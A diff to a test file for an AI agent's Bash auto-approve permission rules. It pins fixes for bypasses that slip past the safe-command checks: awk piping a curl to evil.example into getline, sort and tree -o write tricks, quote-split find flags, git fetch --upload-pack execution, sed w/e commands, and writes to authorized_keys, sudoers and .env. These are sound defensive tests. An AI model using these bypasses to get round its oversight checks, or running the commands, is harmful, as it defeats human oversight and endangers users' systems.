@@ -1,12 +1,16 @@
 import { describe, expect, test } from 'bun:test';
+import { matchAllowPattern } from '../../src/auto-approve/pattern-matcher.ts';
 import {
   BUILTIN_GROUPS,
   isKnownGroup,
   knownGroupNames,
+  matchComposedCommand,
   matchGroups,
   matchGroupsBroad,
   matchReadOnlyCommand,
+  sedScriptShapeVeto,
 } from '../../src/auto-approve/permission-groups.ts';
+import { hasExecPrimitive } from '../../src/auto-approve/shell-safety.ts';
 
 /** The READ groups. Kept as the default for `bash()` so every pre-#959 test
  *  keeps asking exactly what it asked before: adding a write group must not
@@ -89,10 +93,241 @@ describe('permission-groups: read-only Bash (positive)', () => {
     ['wc -l file', 'read-only:wc'],
     ['ls -la', 'read-only:ls'],
     ['jq .version package.json', 'read-only:jq'],
+    // #1057 phase 3 commit 3.
+    ['tr a-z A-Z', 'read-only:tr'],
+    ['comm f1 f2', 'read-only:comm'],
+    ['paste f1 f2', 'read-only:paste'],
+    ['nl file.txt', 'read-only:nl'],
+    ['rev file.txt', 'read-only:rev'],
+    // `awk` is deliberately NOT curated (#1062 C1) -- see the adversarial
+    // block below and the `read-only` group's own comment in
+    // `permission-groups.ts`.
+    ['find . -name "*.ts"', 'read-only:find'],
+    // sort/tree/diff land WITH their SCOPED_VETOES `-o`/`--output` entries --
+    // never bare (sort -o is the module doc's canonical write-escape example).
+    ['ls | sort', 'read-only:ls'],
+    ['sort -u f.txt', 'read-only:sort'],
+    ['diff a.txt b.txt', 'read-only:diff'],
+    ['tree -L 2', 'read-only:tree'],
   ];
   for (const [cmd, expected] of cases) {
     test(cmd, () => expect(bash(cmd)).toBe(expected));
   }
+});
+
+describe('#1057 phase 3 commit 3: find is curated, its ambiguous forms are still vetoed', () => {
+  test('sort attached -o spelling (-ohack) is refused by the scoped veto', () => {
+    expect(bash('sort -ohack in.txt')).toBeNull();
+  });
+
+  test('sort --output long form is refused', () => {
+    expect(bash('sort --output=out.txt in.txt')).toBeNull();
+  });
+
+  // Prefix ABBREVIATIONS (epic-wide review, 2026-08-16): GNU sort accepts
+  // `--out`/`--outp`/… as unambiguous abbreviations of `--output` and writes
+  // the file — a live arbitrary-write bypass past the old exact `--output`
+  // regex. `read-only` is active at every level, so this was broadly reachable.
+  test.each([
+    ['sort --out abbrev', 'sort --out=out.txt in.txt'],
+    ['sort --outp abbrev', 'sort --outp=~/.zshrc in.txt'],
+  ])('%s is refused', (_label, cmd) => {
+    expect(bash(cmd)).toBeNull();
+  });
+
+  // Positive controls: safe sort long flags that merely are NOT prefixes of
+  // `output` must stay COVERED — the abbreviation match is one-way, so it does
+  // not over-veto (`output`.startsWith('stable') is false).
+  test.each([
+    ['sort --stable', 'sort --stable in.txt'],
+    ['sort --reverse', 'sort --reverse in.txt'],
+  ])('%s stays covered (not over-vetoed)', (_label, cmd) => {
+    expect(bash(cmd)).toBe('read-only:sort');
+  });
+
+  test('find -delete is refused', () => {
+    expect(bash('find . -delete')).toBeNull();
+  });
+
+  test('find -exec is refused', () => {
+    expect(bash('find . -exec rm {} \\;')).toBeNull();
+  });
+});
+
+describe('#1062 C1 (CRITICAL RCE): awk is UNCOVERED, not merely vetoed', () => {
+  // awk was previously curated into `read-only` on the theory that
+  // `EXEC_SCOPED_VETOES`'s system()/pipe-to-shell regex caught every
+  // dangerous shape. Adversarial review of this branch proved that false by
+  // execution: awk is Turing-complete, and a raw-text regex over the program
+  // body cannot enumerate every way to run a command, write a file, or read
+  // one from inside the program's own quoting. `awk` was removed from
+  // `read-only` entirely (`permission-groups.ts`), so every case below is
+  // null because NO prefix matches `awk` at all, not because a veto fired --
+  // pinned here so a future re-add of the bare name would be caught by CI
+  // the moment these all stop escalating.
+  const bypasses: Array<[string, string]> = [
+    // `cmd | getline` executes an arbitrary command with no literal
+    // `system(` token anywhere, so the old veto's regex never saw it.
+    ['cmd exec via pipe-to-getline', 'awk \'BEGIN{cmd="id"; cmd | getline r; print r}\''],
+    [
+      'cmd exec via inline pipe-to-getline',
+      'awk \'BEGIN{"curl http://evil.example/x" | getline x; print x}\'',
+    ],
+    // File write entirely inside the program's own quoted string --
+    // invisible to a check looking for shell redirection.
+    ['file write via print >', 'awk \'BEGIN{print "pwned" > "/tmp/authorized_keys"}\''],
+    ['file write via print >>', 'awk \'BEGIN{print "x" >> "/etc/hosts"}\''],
+    // File read (exfiltratable via stdout) entirely inside the program.
+    ['file read via getline <', 'awk \'BEGIN{while((getline l < "/tmp/id_rsa")>0) print l}\''],
+    // Trivial string-splicing of the literal token the old regex matched on.
+    ['quote-spliced system(', 'awk "BEGIN{sys""tem(\\"id\\")}"'],
+    ['spaced system (', 'awk \'BEGIN{system ("id")}\''],
+    ['pipe into a shell', 'awk \'BEGIN{print "id" | "/bin/sh"}\''],
+  ];
+  for (const [label, cmd] of bypasses) {
+    test(`${label}: null (uncovered)`, () => expect(bash(cmd)).toBeNull());
+  }
+
+  // Confirms the removal itself (not some other veto) is what changed the
+  // outcome: even the exact HARMLESS program shape that used to approve at
+  // `read-only:awk` -- no `system()`, no pipe, no file redirect at all -- is
+  // now equally uncovered, because no prefix named `awk` exists any more.
+  test('a harmless awk program is uncovered too (removal, not a veto)', () => {
+    expect(bash("awk '{print $1}' file.txt")).toBeNull();
+  });
+
+  test('the neighboring `ls` in a pipe stays covered on its own, but the compound is not', () => {
+    expect(bash('ls')).toBe('read-only:ls');
+    expect(bash("ls | awk '{print $1}'")).toBeNull();
+  });
+});
+
+describe('#1062 C2: sort/tree -o bundled into a leading short-flag cluster', () => {
+  // Neither GNU nor BSD `sort` has any OTHER short flag containing the
+  // letter `o` (`-b -c -C -d -f -g -i -k -m -M -n -R -r -S -s -t -T -u -V -z
+  // -h`), and `tree` likewise has none besides `-o` itself. So `o` bundled
+  // ANYWHERE into a leading short-flag cluster can only mean the write flag
+  // is present -- the previous `/(^|\s)(-o|--output)/` matched `-o` only at
+  // a word boundary and missed every bundled spelling (CONFIRMED bypass,
+  // proven: `sort -ro out.txt in.txt` and `sort -uo ~/.ssh/authorized_keys
+  // pub.txt` both approved before this fix).
+  const bypasses: Array<[string, string]> = [
+    ['sort -ro', 'sort -ro out.txt in.txt'],
+    ['sort -uo (sensitive target)', 'sort -uo /Users/yahya/.ssh/authorized_keys pub.txt'],
+    ['sort -rno (sensitive target)', 'sort -rno /etc/sudoers in.txt'],
+    ['tree -no', 'tree -no out.txt'],
+    ['tree -nio', 'tree -nio t2'],
+  ];
+  for (const [label, cmd] of bypasses) {
+    test(`${label}: null`, () => expect(bash(cmd)).toBeNull());
+  }
+
+  // Positive controls: none of these bundle the letter `o`, so the scoped
+  // veto must not fire on them.
+  test('sort -u f.txt is still covered', () =>
+    expect(bash('sort -u f.txt')).toBe('read-only:sort'));
+  test('sort -rn f is still covered', () => expect(bash('sort -rn f')).toBe('read-only:sort'));
+  test('tree -L 2 is still covered', () => expect(bash('tree -L 2')).toBe('read-only:tree'));
+  test('tree -a is still covered', () => expect(bash('tree -a')).toBe('read-only:tree'));
+});
+
+describe('#1062 C3: find write/exec primitives that a quote splits past the raw-text check', () => {
+  // `EXEC_PRIMITIVE_TOKEN` (shell-safety.ts) vetoes these primitives on RAW
+  // segment text, consulted unconditionally by `matchCoveredCommand`. But
+  // that check runs against the STILL-QUOTED text, so a quote embedded
+  // inside the flag spelling (`-fprin"t"`) defeats the raw-text regex
+  // entirely, and (before this fix) `MUTATION_TOKEN` -- the quote-NORMALIZED
+  // check `readSegmentVeto` re-runs via `shellWords` -- did not list these
+  // spellings either, so nothing caught the unquoted form (CONFIRMED
+  // bypass).
+  const bypasses: Array<[string, string]> = [
+    ['-fprint (quote-split)', 'find . -fprin"t" /tmp/x'],
+    ['-fprintf (quote-split)', "find . -fprintf /tmp/x '%p'"],
+    [
+      '-fprintf (quote-split, sensitive target)',
+      'find . -fprint"f" /Users/yahya/.ssh/authorized_keys \'%p\'',
+    ],
+    ['-fls (quote-split)', 'find . -f"ls" /tmp/x'],
+    ['-okdir (quote-split)', 'find . -okd"ir" rm {} ;'],
+  ];
+  for (const [label, cmd] of bypasses) {
+    test(`${label}: null`, () => expect(bash(cmd)).toBeNull());
+  }
+
+  test('positive control: plain find stays covered', () => {
+    expect(bash('find . -name "*.ts"')).toBe('read-only:find');
+    expect(bash('find . -type f')).toBe('read-only:find');
+  });
+});
+
+describe('#1062 C4 (CRITICAL RCE): git remote-exec flags on git fetch (vcs-read)', () => {
+  // `git fetch --upload-pack=/tmp/evil.sh <repo>` runs `/tmp/evil.sh`
+  // LOCALLY in place of the real `git-upload-pack` on the remote end --
+  // proven by execution. `--receive-pack` is the identical primitive for
+  // the push/receive side; `--exec` is `git fetch`'s own alias for
+  // `--upload-pack`. `git fetch` sits in `vcs-read` with no `segmentVeto` of
+  // its own, so before this fix nothing on the read side refused it
+  // (CONFIRMED bypass; the write-side `vcs-write` group already refused the
+  // `git pull` spelling via `write-flag-safety.ts`'s `dangerousLongFlags` --
+  // see the positive control below).
+  const STRICT = ['read-only', 'vcs-read', 'build-test'];
+  const bypasses: Array<[string, string]> = [
+    ['--upload-pack=', 'git fetch --upload-pack=/tmp/evil.sh /tmp/repo'],
+    ['--upload-pack (space-separated)', 'git fetch --upload-pack /tmp/evil.sh /tmp/repo'],
+    ['--upload-pack="..."', 'git fetch --upload-pack="/tmp/evil.sh" /tmp/repo'],
+    ['--upload-pack= after a remote URL', 'git fetch ssh://h/r --upload-pack=/tmp/e'],
+    ['--exec=', 'git fetch --exec=/tmp/evil origin'],
+    ['--receive-pack=', 'git fetch --receive-pack=x r'],
+    // Prefix ABBREVIATIONS (epic-wide review, 2026-08-16): git resolves an
+    // unambiguous abbreviation to the full flag and runs it identically
+    // (`git fetch --upl` errors with "option `upload-pack' requires a value").
+    // The old exact-spelling regex walked straight past these — a live RCE
+    // bypass. Now caught by `hasDangerousLongFlagAbbrev`.
+    ['--upl= (upload-pack abbrev)', 'git fetch --upl=/tmp/evil.sh /tmp/repo'],
+    ['--upload-pac= (upload-pack abbrev)', 'git fetch --upload-pac=/tmp/evil /tmp/repo'],
+    ['--ex= (exec abbrev)', 'git fetch --ex=/tmp/evil origin'],
+    ['--receive-pac= (receive-pack abbrev)', 'git fetch --receive-pac=x r'],
+  ];
+  for (const [label, cmd] of bypasses) {
+    test(`${label}: null`, () => expect(matchGroups('Bash', { command: cmd }, STRICT)).toBeNull());
+  }
+
+  test('positive controls: ordinary git fetch stays covered', () => {
+    const bash2 = (cmd: string) => matchGroups('Bash', { command: cmd }, STRICT);
+    expect(bash2('git fetch --all')).toBe('vcs-read:git fetch');
+    expect(bash2('git fetch origin main')).toBe('vcs-read:git fetch');
+    expect(bash2('git fetch -q')).toBe('vcs-read:git fetch');
+  });
+
+  test('git pull --upload-pack=... was already refused at vcs-write (write-flag-safety.ts), unaffected by this change', () => {
+    const TRUSTED = [
+      'read-only',
+      'vcs-read',
+      'build-test',
+      'fs-write',
+      'scratch',
+      'vcs-write',
+      'artifact-clean',
+    ];
+    expect(
+      matchGroups('Bash', { command: 'git pull --upload-pack=/tmp/evil.sh /tmp/repo' }, TRUSTED),
+    ).toBeNull();
+    expect(matchGroups('Bash', { command: 'git pull origin main' }, TRUSTED)).toBe(
+      'vcs-write:git pull',
+    );
+  });
+});
+
+describe('#1057 phase 3 commit 3: printf is neutral (NEUTRAL_PREFIXES)', () => {
+  test('the #996 sample: a for-loop header using printf for progress text', () => {
+    expect(
+      bash('for p in 11 14; do printf "obs #%s: " $p; gh pr checks $p 2>&1|head -1; done'),
+    ).toBe('vcs-read:gh pr checks');
+  });
+
+  test('bare printf alone is not a read (neutral-only commands match nothing)', () => {
+    expect(bash('printf "hi"')).toBeNull();
+  });
 });
 
 describe('permission-groups: vcs-read Bash (positive)', () => {
@@ -106,6 +341,7 @@ describe('permission-groups: vcs-read Bash (positive)', () => {
     ['git rev-parse --abbrev-ref HEAD', 'vcs-read:git rev-parse'],
     ['git reflog show --oneline', 'vcs-read:git reflog show'],
     ['git config --get user.email', 'vcs-read:git config --get'],
+    ['git fetch --all', 'vcs-read:git fetch'],
     ['gh pr diff 494', 'vcs-read:gh pr diff'],
     ['gh pr view 494 --json title', 'vcs-read:gh pr view'],
     ['gh run list --limit 5', 'vcs-read:gh run list'],
@@ -213,11 +449,15 @@ describe('permission-groups: adversarial (MUST fall through to LLM, never group-
     'git diff HEAD \ngit commit --allow-empty -m pwned',
     'cat README.md \nchmod 777 /etc/passwd',
     'git log \t\ngit push', // whitespace-then-newline
-    // commands intentionally excluded from the curated set
+    // `find`/`awk` are curated as of #1057 phase 3 commit 3, but their
+    // ambiguous-flag forms are still refused -- by `hasExecPrimitive`
+    // (shell-safety.ts), not by the prefix being absent.
     'find . -name x -delete',
     'find . -exec rm {} +',
-    'sort -o out.txt in.txt', // -o writes
     'awk \'{system("rm x")}\'',
+    // commands intentionally excluded from the curated set (no veto exists
+    // for the ambiguous flag, unlike `find`/`awk` above)
+    'sort -o out.txt in.txt', // -o writes
     'gh api -X POST /repos/o/r/issues', // gh api excluded entirely
     // word-boundary: must not match a longer command sharing the prefix text
     'git showoff --now',
@@ -372,10 +612,16 @@ describe('vcs-write: covered', () => {
     ['git stash pop', 'vcs-write:git stash'],
     ['git stash pop -q', 'vcs-write:git stash'],
     ['git worktree add ../x -b feature/y', 'vcs-write:git worktree add'],
+    // #1057 phase 3 commit 3.
+    ['git pull -q', 'vcs-write:git pull'],
   ];
   for (const [cmd, expected] of cases) {
     test(cmd, () => expect(bash(cmd, WRITE_GROUPS)).toBe(expected));
   }
+
+  test('git pull needs vcs-write requested -- read groups alone do not cover it', () => {
+    expect(bash('git pull', ALL)).toBeNull();
+  });
 });
 
 describe('vcs-write: MUST NOT cover', () => {
@@ -627,10 +873,27 @@ describe('#960 regression: build surface + the DEFAULT-ON build-test group', () 
     'cp x pyproject.toml',
     'cp x bunfig.toml',
     'mv evil bun.lock',
+    // #1061 additions: jest/webpack/rollup/babel/vite build-surface configs.
+    'cp x jest.config.js',
+    'cp x webpack.config.ts',
+    'cp x rollup.config.js',
+    'cp x babel.config.js',
+    'cp x .babelrc',
+    'cp x vite.config.ts',
   ];
   for (const cmd of mustBeNull) {
     test(JSON.stringify(cmd), () => expect(bash(cmd, WRITE_GROUPS)).toBeNull());
   }
+
+  test('#1061: the redirect-grant path is covered too, not just the direct-argument path', () => {
+    // `jest.config.js` is a read-side redirect TARGET here (`cat` is
+    // read-only, `fs-write` is what would otherwise delete the `>` clause) --
+    // exercising BUILD_SURFACE through `isGrantedFsWriteRedirectTarget`
+    // rather than through `segmentTouchesSensitivePath`'s direct-argument
+    // scan, so a future regression that only re-checks one of the two paths
+    // is caught by this pairing.
+    expect(bash('cat payload > jest.config.js', [...ALL, ...WRITE_GROUPS])).toBeNull();
+  });
 
   test('the mutating tools are guarded too', () => {
     for (const file_path of [
@@ -703,6 +966,21 @@ describe('#959 final pass: every write prefix is covered by a flag policy', () =
   // their flag policy inside `artifactCleanVeto` itself (an exact structural
   // allowlist) -- the probe asserts the same PROPERTY either way: an
   // unclassified flag is refused, wherever the policy lives.
+  //
+  // NOTE for the "sed -i" prefix specifically (review pass, #1061):
+  // `writeGroupVeto` is `hasUnsafeWriteFlag(...) || ... || sedScriptShapeVeto(...)`,
+  // and `hasUnsafeWriteFlag` runs FIRST, so for `sed -i -Zqx target` it is
+  // genuinely the flag axis that produces `null` here -- verified directly:
+  // `hasUnsafeWriteFlag('sed -i -Zqx target')` is `true` on its own, which
+  // short-circuits the `||` before `sedScriptShapeVeto` (which would ALSO
+  // refuse "target" as an invalid script) is ever called. What this specific
+  // generated case does NOT do is isolate which of the cluster's three
+  // letters (`Z`, `q`, `x`) is doing the work -- none of them is individually
+  // on sed's safe list, so a mutation that flipped only ONE of the three to
+  // "safe" would not flip this test's outcome. The dedicated `sed -i -Z
+  // 's/a/b/' f` / `sed -i -w 's/a/b/' f` cases in the "#1057 phase 2 commit
+  // 4" describe block below use a single unsafe letter against an otherwise
+  // VALID script, closing that gap.
   const WRITE_GROUP_NAMES = ['fs-write', 'vcs-write', 'artifact-clean'];
 
   for (const groupName of WRITE_GROUP_NAMES) {
@@ -894,6 +1172,39 @@ describe('scratch: output redirection to a scratch target', () => {
   });
 });
 
+/**
+ * #1060 + ADR 0018 axis 3. The scratch redirect carve-out proved a target
+ * was under a scratch root and stopped there -- it never asked WHAT the
+ * target named, so a redirect INTO `/tmp/.env`, `/tmp/.git/hooks/pre-commit`
+ * or `/tmp/sub/package.json` had its clause deleted before
+ * `segmentTouchesSensitivePath` ever saw the token it exists to veto.
+ * Measured live before the fix: all three approved at 0ms on
+ * `['scratch', 'read-only']`.
+ */
+describe('#1060: a scratch-granted redirect target must not be sensitive', () => {
+  const READ_PLUS_SCRATCH = ['scratch', 'read-only'];
+
+  const sensitiveTargets: Array<[string, string]> = [
+    ['cat a > /tmp/.env', 'a credential basename, inside a scratch root'],
+    ['cat a > /tmp/.git/hooks/pre-commit', 'git hook: code execution on the next commit'],
+    ['cat a > /tmp/sub/package.json', 'build surface, nested under the scratch root'],
+  ];
+
+  for (const [cmd, why] of sensitiveTargets) {
+    test(`${JSON.stringify(cmd)} — ${why}`, () => {
+      expect(bash(cmd, READ_PLUS_SCRATCH)).toBeNull();
+    });
+  }
+
+  test('the fix does not over-narrow: an ordinary scratch redirect still matches', () => {
+    expect(bash('cat a > /tmp/out.txt', READ_PLUS_SCRATCH)).toBe('read-only:cat');
+  });
+
+  test('the fix does not over-narrow: a nested non-sensitive redirect still matches', () => {
+    expect(bash('cat a > /tmp/nested/ok.txt', READ_PLUS_SCRATCH)).toBe('read-only:cat');
+  });
+});
+
 describe('scratch: level membership', () => {
   test('scratch alone does not need fs-write or vcs-write', () => {
     expect(bash('rm -rf /tmp/x', ['scratch'])).toBe('scratch:rm');
@@ -1070,6 +1381,380 @@ describe('#1000: a cd whose effect is not guaranteed does not move the tracked r
 });
 
 /**
+ * #1041: 58% of trusted Bash escalations measured on a real machine were
+ * plain file writes -- `cat a.txt > notes.md`, `bun test > out.log 2>&1`,
+ * `git diff > review.diff` -- heads already covered by `read-only`,
+ * `build-test` and `vcs-read`, escalating only because the redirect target
+ * looked like shell control to `hasShellControl`. `fs-write` already approves
+ * exactly this operation through the `Write` tool, so this grant lets it
+ * approve the Bash spelling too: a path-kind redirect clause may be deleted
+ * when its cwd-resolved target is a RELATIVE path that does not ascend out of
+ * the directory the command started in, and is not a sensitive destination.
+ *
+ * `WRITE_GROUPS_NO_SCRATCH` deliberately omits `scratch`, to isolate the
+ * fs-write grant from the pre-existing absolute-root one -- a command that
+ * needs `scratch` to pass here would be pinning the wrong grant.
+ */
+describe('#1041: fs-write grants a relative, non-ascending, non-sensitive redirect', () => {
+  const WRITE_GROUPS_NO_SCRATCH = [...ALL, 'fs-write'];
+
+  describe('covered', () => {
+    const covered: Array<[string, string]> = [
+      ['cat a.txt > notes.md', 'read-only:cat'],
+      ['cat a >> log.txt', 'read-only:cat'],
+      ['bun test > out.log 2>&1', 'build-test:bun test'],
+      ['git diff > review.diff', 'vcs-read:git diff'],
+      ['cd sub && cat a > out.txt', 'read-only:cat'],
+      ['cat a > docs/notes.md', 'read-only:cat'],
+    ];
+    for (const [cmd, expected] of covered) {
+      test(`${JSON.stringify(cmd)} -> ${expected}`, () => {
+        expect(bash(cmd, WRITE_GROUPS_NO_SCRATCH)).toBe(expected);
+      });
+    }
+  });
+
+  describe('MUST NOT cover (falls through to the LLM)', () => {
+    const mustBeNull: Array<[string, string]> = [
+      ['cat a > /etc/hosts', 'absolute target, outside any scratch root'],
+      ['cat a > ~/x', 'home-rooted target'],
+      ['cat a > $HOME/x', '$HOME is absolute-shaped, never composed'],
+      ['cat a > ../escape.txt', 'ascends above the start with no cd at all'],
+      ['cat a > sub/../../escape.txt', 'composes to an ascent above the start'],
+      ['cat a > .env', 'a credential basename'],
+      ['cat a > package.json', 'a build surface'],
+      ['cat a > .git/hooks/pre-commit', 'git hook: code execution on the next commit'],
+      ['cd /opt && cat a > x', 'an absolute cd kills the relative grant, sticky'],
+      ['cd $DIR && cat a > x', 'an unresolvable cd target kills the grant, sticky'],
+      ['cat a > "quoted path.txt"', 'opaque target: quoting is never composed'],
+      ['cat a >| x', 'clobber redirect: opaque target'],
+      ['cat a &> x', 'merge redirect: the residual & still backgrounds'],
+      ['cat a > >(tee x)', 'process substitution: hasShellControl catches <( and >('],
+      ['cat a >/tmp/a>/etc/passwd', 'glued redirect (#1000): opaque target'],
+      ['echo hi > notes.md', 'echo is neutral, so nothing ever matches a prefix'],
+    ];
+    for (const [cmd, why] of mustBeNull) {
+      test(`${JSON.stringify(cmd)} — ${why}`, () => {
+        expect(bash(cmd, WRITE_GROUPS_NO_SCRATCH)).toBeNull();
+      });
+    }
+
+    test('fs-write not in groups: the same redirect stays refused', () => {
+      expect(bash('cat a > notes.md', ALL)).toBeNull();
+    });
+  });
+
+  test('cd composition: a relative cd chain that returns to the start still grants', () => {
+    expect(bash('cd sub && cd .. && cat a > out.txt', WRITE_GROUPS_NO_SCRATCH)).toBe(
+      'read-only:cat',
+    );
+  });
+
+  test('cd composition: ascending past the start kills the grant', () => {
+    expect(bash('cd sub && cd .. && cd .. && cat a > out.txt', WRITE_GROUPS_NO_SCRATCH)).toBeNull();
+  });
+
+  test('the two grants compose: either proof deletes the clause', () => {
+    const BOTH = [...ALL, 'fs-write', 'scratch'];
+    // scratch's own absolute-root grant, unaffected by fs-write being active too.
+    expect(bash('cat a > /tmp/out.txt', BOTH)).toBe('read-only:cat');
+    // fs-write's relative grant, unaffected by scratch being active too.
+    expect(bash('cat a > notes.md', BOTH)).toBe('read-only:cat');
+  });
+
+  test('every existing scratch-only behavior is unaffected by the generalization', () => {
+    expect(bash('rm -rf /tmp/x', SCRATCH_GROUPS)).toBe('scratch:rm');
+    expect(bash('cat file.txt > /tmp/out.txt', ['scratch', 'read-only'])).toBe('read-only:cat');
+    expect(bash('cat file.txt > /etc/passwd', ['scratch', 'read-only'])).toBeNull();
+  });
+});
+
+/**
+ * #1057 phase 2, commit 3: heredoc excision. Heredocs appear NOWHERE in the
+ * decision code before this. Today `tee /tmp/x <<EOF` (one physical line, no
+ * real newline) approves because `<<EOF` just sits as an inert extra token;
+ * a genuine MULTI-LINE heredoc escalates only by ACCIDENT, because
+ * `splitCompoundParts` treats an unquoted newline as a separator and a body
+ * line essentially never happens to prefix-match a curated command. This
+ * block pins the deliberate replacement: excise the operator + body when it
+ * can be proven safe to do so, and fall back to that same accidental (but
+ * safe) behavior the instant it cannot be proven.
+ */
+describe('#1057 phase 2 commit 3: heredoc excision (group path only)', () => {
+  const WRITE_GROUPS_NO_SCRATCH = [...ALL, 'fs-write'];
+  const EVERYTHING = [...ALL, ...WRITE_GROUPS, ...SCRATCH_GROUPS, ...ARTIFACT_GROUPS];
+
+  describe('covered: excision composes with the existing redirect grants', () => {
+    const cases: Array<[string, string, string[], string]> = [
+      [
+        "cat > notes.md <<'EOF'\nhello\nEOF",
+        'quoted delimiter: excised, then the fs-write relative redirect grant deletes "> notes.md"',
+        WRITE_GROUPS_NO_SCRATCH,
+        'read-only:cat',
+      ],
+      [
+        'tee notes.md <<EOF\nplain text\nEOF',
+        'unquoted delimiter, inert body: excised outright, tee itself is the fs-write-owned prefix, no redirect grant needed',
+        WRITE_GROUPS,
+        'fs-write:tee',
+      ],
+    ];
+    for (const [cmd, why, groups, expected] of cases) {
+      test(`${JSON.stringify(cmd)} — ${why}`, () => {
+        expect(bash(cmd, groups)).toBe(expected);
+      });
+    }
+    test("tee /tmp/x <<'EOF'\\nbody\\nEOF — scratch: absolute root grant, unaffected", () => {
+      expect(bash("tee /tmp/x <<'EOF'\nbody\nEOF", SCRATCH_GROUPS)).toBe('scratch:tee');
+    });
+    test('notes.md case actually resolves via fs-write, not just read-only', () => {
+      // Sanity: the fs-write group's own redirect grant is what let this through
+      // -- without it requested, the same command must fall back to null.
+      expect(bash("cat > notes.md <<'EOF'\nhello\nEOF", ALL)).toBeNull();
+    });
+  });
+
+  test("regression guard: today's single-line accidental approval is unaffected", () => {
+    // No real newline in this string at all -- there is no terminator to find,
+    // so excision aborts (unterminated, fails closed) and the command reaches
+    // the existing machinery byte-for-byte, exactly as it did before commit 3.
+    expect(bash('tee /tmp/x <<EOF', WRITE_GROUPS)).toBe('fs-write:tee');
+    // Under `scratch` alone the same string was ALREADY refused before this
+    // commit (`scratchTargetVeto` treats the glued `<<EOF` token as a
+    // non-scratch-rooted positional target) -- unaffected either way.
+    expect(bash('tee /tmp/x <<EOF', SCRATCH_GROUPS)).toBeNull();
+  });
+
+  test("safety invariant: no interpreter is in any group's command list, before or after excision", () => {
+    for (const cmd of [
+      "bash <<'EOF'\nrm -rf /\nEOF",
+      "python3 - <<'PY'\nprint(1)\nPY",
+      'sh <<X\necho hi\nX',
+    ]) {
+      expect(bash(cmd, EVERYTHING)).toBeNull();
+    }
+  });
+
+  describe("MUST NOT excise (falls through to today's accidental, still-safe behavior)", () => {
+    const mustBeNull: Array<[string, string]> = [
+      [
+        'cat > x <<EOF\n$(rm -rf /)\nEOF',
+        'unquoted delimiter, LIVE body: the shell would run $(...) expanding it, so excision must not hide that execution from the matcher',
+      ],
+      [
+        "cat > x <<'EOF'\nbody",
+        'unterminated: no line ever matches the delimiter, so nothing is proven removable',
+      ],
+      [
+        'cat > x <<\'EOF\'\n"EOF"\nrm -rf /',
+        'terminator-inside-quotes spoof with NO real terminator: a quoted lookalike must not count as the delimiter line, so this stays unterminated and falls through',
+      ],
+      [
+        'cat > x <<E$OF\nbody\nE$OF',
+        'delimiter contains $: fails the plain-word shape, so no excision is attempted',
+      ],
+      [
+        'cat > a.txt <<EOF\nfirst\nEOF\ncat > b.txt <<BAD!\nsecond\nBAD!',
+        'a VALID first heredoc followed by a second heredoc with an invalid delimiter (BAD! contains a non-word character): excision must abort for the WHOLE command and return it byte-for-byte -- pinning the `return command` path, not a partial reconstruction that keeps the first heredoc already excised',
+      ],
+    ];
+    for (const [cmd, why] of mustBeNull) {
+      test(`${JSON.stringify(cmd)} — ${why}`, () => {
+        expect(bash(cmd, WRITE_GROUPS_NO_SCRATCH)).toBeNull();
+      });
+    }
+  });
+
+  test('a quoted lookalike inside the body does not end the heredoc early, when a real terminator follows', () => {
+    // Same body as the spoof case above, but with a genuine trailing bare
+    // `EOF`. The quoted "EOF" line must be skipped as a candidate terminator,
+    // so the WHOLE body -- including the "rm -rf /"-shaped line -- is proven
+    // to be inert heredoc data and excised along with the real terminator,
+    // never examined as a command in its own right.
+    expect(bash('cat > x <<\'EOF\'\n"EOF"\nrm -rf /\nEOF', WRITE_GROUPS_NO_SCRATCH)).toBe(
+      'read-only:cat',
+    );
+  });
+
+  test('<<< here-strings are excluded outright and behave exactly as before', () => {
+    // A run of 3+ `<` is never a heredoc operator, so this command is not
+    // even a candidate for excision -- `exciseHeredocsForGroups` returns it
+    // unchanged, and today's (pre-commit-3) behavior is reproduced exactly.
+    expect(bash('cat <<< "hello"', ALL)).toBe('read-only:cat');
+  });
+
+  test('a body line that looks like a covered command must not leak coverage', () => {
+    // "git status" is BODY, wholly excised along with the operator and the
+    // terminator -- the command's coverage is decided by the `cat` head
+    // alone, which takes no arguments here, so this must equal bare `cat`.
+    const withHeredoc = bash("cat <<'EOF'\ngit status\nEOF", WRITE_GROUPS_NO_SCRATCH);
+    expect(withHeredoc).toBe(bash('cat', WRITE_GROUPS_NO_SCRATCH));
+    expect(withHeredoc).toBe('read-only:cat');
+  });
+});
+
+/**
+ * #1057 phase 2, commit 4: `sed -i` under a strict script-shape allowlist.
+ * Every script the command would actually run must be a single, unconditional
+ * `s///` or `y///` -- no address prefix, no brace block, no `w`/`e`/`r`/`R`
+ * side-command, no chained `;`. Destinations still go through the same
+ * `segmentTouchesSensitivePath` axis every other fs-write prefix does.
+ */
+describe('#1057 phase 2 commit 4: sed -i script-shape allowlist', () => {
+  describe('covered', () => {
+    const cases: Array<[string, string]> = [
+      ["sed -i 's/a/b/' file.txt", 'fs-write:sed -i'],
+      ["sed -i 's/a/b/g' f", 'fs-write:sed -i'],
+      ["sed -i -e 's/a/b/' f", 'fs-write:sed -i'],
+      ["sed -i 'y/abc/xyz/' f", 'fs-write:sed -i'],
+      // BSD empty-suffix form: `-i` and the following literal `''` are TWO
+      // tokens, so this still starts with the curated `sed -i ` prefix.
+      ["sed -i '' 's/a/b/' f", 'fs-write:sed -i'],
+    ];
+    for (const [cmd, expected] of cases) {
+      test(cmd, () => expect(bash(cmd, WRITE_GROUPS)).toBe(expected));
+    }
+  });
+
+  describe('MUST NOT cover: named adversaries (falls through to the LLM)', () => {
+    const mustBeNull: Array<[string, string]> = [
+      [
+        "sed -i 's/x/y/w /etc/cron.d/evil' f",
+        'the w side-command writes an ARBITRARY second file, unrelated to the destination axis',
+      ],
+      ["sed -i 's/x/y/e' f", 'the e flag executes the substitution result as a shell command'],
+      ["sed -i '1,5d' f", 'an address-range prefix, not a bare s/// or y///'],
+      ["sed -i '/x/d' f", 'an address-regex prefix, not a bare s/// or y///'],
+      [
+        "sed -i -e 's/a/b/' -e 'e date' f",
+        'a SECOND -e script fails the shape even though the first one passes',
+      ],
+      [
+        'sed --file=evil.sed -i f',
+        // #1061 review: relabeled. `matchPrefix` requires the curated prefix
+        // to be followed by a literal space (`sed -i `); this segment does
+        // not even START with that text (it starts `sed --file=`), so it is
+        // refused by PREFIX MISMATCH before `writeGroupVeto`/the flag axis is
+        // ever consulted -- not because `--file` was recognized and rejected.
+        // See `sed -i --file=evil.sed f` below for a spelling that actually
+        // reaches, and is refused by, the flag axis.
+        'refused by PREFIX MISMATCH (does not start with the curated "sed -i " prefix), not the flag axis',
+      ],
+      [
